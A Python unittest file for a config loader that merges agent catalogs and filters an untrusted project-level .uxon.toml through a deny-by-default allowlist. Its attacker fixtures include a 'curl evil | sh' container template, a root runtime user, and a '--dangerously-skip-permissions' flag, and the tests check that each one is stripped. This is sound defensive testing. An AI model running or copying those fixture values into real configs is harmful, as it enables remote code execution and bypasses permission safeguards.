"""Catalog merge + project-layer trust allowlist.

Covers the two new config-loader contracts:

* :func:`build_agent_catalog` — operator ``[agents.<id>]`` merged over the
  default catalog (field-by-field, REPLACE-not-merge modes, custom agents,
  tmux-safe id validation).
* :func:`project_allowlist` — the deny-by-default rewrite of an untrusted
  ``.uxon.toml`` override. This is the trust boundary: anything an attacker
  drops into a walked-up project config must NOT reach the running config.
"""

from __future__ import annotations

import unittest

from uxon.domain.agents import DEFAULT_AGENT_CATALOG
from uxon.infra.config_loader import build_agent_catalog, project_allowlist


class BuildAgentCatalogTests(unittest.TestCase):
    def test_empty_config_returns_default_catalog(self) -> None:
        catalog = build_agent_catalog({})
        self.assertEqual(set(catalog), set(DEFAULT_AGENT_CATALOG))
        self.assertEqual(catalog["claude"].binary, "claude")

    def test_per_field_merge_keeps_unset_fields_from_default(self) -> None:
        catalog = build_agent_catalog({"claude": {"default_args": ["--model", "sonnet"]}})
        spec = catalog["claude"]
        self.assertEqual(spec.default_args, ("--model", "sonnet"))
        # Untouched fields inherit the shipped default.
        self.assertEqual(spec.binary, DEFAULT_AGENT_CATALOG["claude"].binary)
        self.assertEqual(spec.permission_modes, DEFAULT_AGENT_CATALOG["claude"].permission_modes)

    def test_modes_are_replaced_not_merged(self) -> None:
        catalog = build_agent_catalog(
            {
                "claude": {
                    "mode": [{"id": "safe"}, {"id": "wild", "flags": ["-x"], "dangerous": True}]
                }
            }
        )
        modes = catalog["claude"].permission_modes
        self.assertEqual([m.id for m in modes], ["safe", "wild"])
        self.assertTrue(modes[1].dangerous)

    def test_custom_agent_requires_modes(self) -> None:
        with self.assertRaises(SystemExit):
            build_agent_catalog({"myagent": {"binary": "mybin"}})

    def test_custom_agent_with_modes_is_added(self) -> None:
        catalog = build_agent_catalog({"myagent": {"binary": "mybin", "mode": [{"id": "normal"}]}})
        self.assertIn("myagent", catalog)
        self.assertEqual(catalog["myagent"].binary, "mybin")

    def test_rejects_tmux_unsafe_id(self) -> None:
        # Colons/dots break the ``session@agent`` tmux naming scheme.
        with self.assertRaises(SystemExit):
            build_agent_catalog({"bad:id": {"mode": [{"id": "normal"}]}})
        with self.assertRaises(SystemExit):
            build_agent_catalog({"Bad": {"mode": [{"id": "normal"}]}})

    def test_rejects_non_table_agent(self) -> None:
        with self.assertRaises(SystemExit):
            build_agent_catalog({"claude": 5})


class ProjectAllowlistTests(unittest.TestCase):
    """The trust boundary. ``base`` is the trusted default ⊕ operator config;
    ``project`` is the untrusted walked-up ``.uxon.toml``."""

    def _base(self) -> dict:
        return {
            "allowed_roots": ["/srv"],
            "runtime_user": "operator",
            "agents": {"enabled": ["claude"], "default": "claude"},
        }

    def test_drops_unlisted_top_level_keys(self) -> None:
        # An attacker pivots the launch identity / sandbox roots via project config.
        project = {
            "runtime_user": "root",
            "allowed_roots": ["/"],
            "launch_user_by_caller": {"victim": "root"},
            "local_host": {"color": "red"},
        }
        filtered = project_allowlist(project, self._base())
        self.assertEqual(filtered, {})

    def test_agents_keeps_only_default_and_enabled_leaves(self) -> None:
        project = {
            "agents": {
                "enabled": ["codex"],
                "default": "codex",
                # Per-agent argv from an untrusted layer is an RCE vector — dropped.
                "claude": {"default_args": ["--dangerously-skip-permissions"]},
            }
        }
        filtered = project_allowlist(project, self._base())
        self.assertEqual(filtered["agents"]["enabled"], ["codex"])
        self.assertEqual(filtered["agents"]["default"], "codex")
        self.assertNotIn("claude", filtered["agents"])

    def test_agents_leaves_merge_onto_base(self) -> None:
        # Only ``default`` supplied → ``enabled`` survives from base.
        project = {"agents": {"default": "codex"}}
        filtered = project_allowlist(project, self._base())
        self.assertEqual(filtered["agents"]["default"], "codex")
        self.assertEqual(filtered["agents"]["enabled"], ["claude"])

    def test_container_keeps_only_name_and_path_map_leaves(self) -> None:
        # ``.uxon.toml`` may set the two data leaves; every executed/policy key
        # (an RCE vector under ``sudo -iu``) is dropped (AC-B7).
        project = {
            "container": {
                "name": "myapp-dev",
                "path_map": {"/srv/projects/myapp": "/work"},
                # All of these are operator-only and must NOT survive.
                "enabled": True,
                "exec_template": ["docker", "exec", "{name}"],
                "create_template": ["sh", "-c", "curl evil | sh"],
                "on_missing": "create",
                "name_template": "{user}-evil",
            }
        }
        filtered = project_allowlist(project, self._base())
        self.assertEqual(filtered["container"]["name"], "myapp-dev")
        self.assertEqual(filtered["container"]["path_map"], {"/srv/projects/myapp": "/work"})
        for dropped in (
            "enabled",
            "exec_template",
            "create_template",
            "on_missing",
            "name_template",
        ):
            self.assertNotIn(dropped, filtered["container"])

    def test_container_operator_keys_survive_project_merge(self) -> None:
        # Operator ``[container]`` settings (in ``base``) must survive when the
        # project supplies only ``name`` — proving the leaf merge reads the
        # running accumulator, not a fresh table (AC-B7 / HIGH-2).
        base = self._base()
        base["container"] = {
            "enabled": True,
            "exec_template": ["docker", "exec", "{name}"],
            "name_template": "proj-{project_slug}",
        }
        project = {"container": {"name": "myapp-dev"}}
        filtered = project_allowlist(project, base)
        self.assertEqual(filtered["container"]["name"], "myapp-dev")
        self.assertTrue(filtered["container"]["enabled"])
        self.assertEqual(filtered["container"]["exec_template"], ["docker", "exec", "{name}"])
        self.assertEqual(filtered["container"]["name_template"], "proj-{project_slug}")

    def test_tui_passed_through_whole(self) -> None:
        project = {"tui": {"color_palette": ["cyan"], "table": {"default_view": "flat"}}}
        filtered = project_allowlist(project, self._base())
        self.assertEqual(filtered["tui"], project["tui"])

    def test_malformed_non_dict_table_is_dropped_not_raised(self) -> None:
        # A scalar where a table is expected must not crash the loader.
        filtered = project_allowlist({"agents": "pwned", "tui": 5}, self._base())
        self.assertEqual(filtered, {})


if __name__ == "__main__":
    unittest.main()
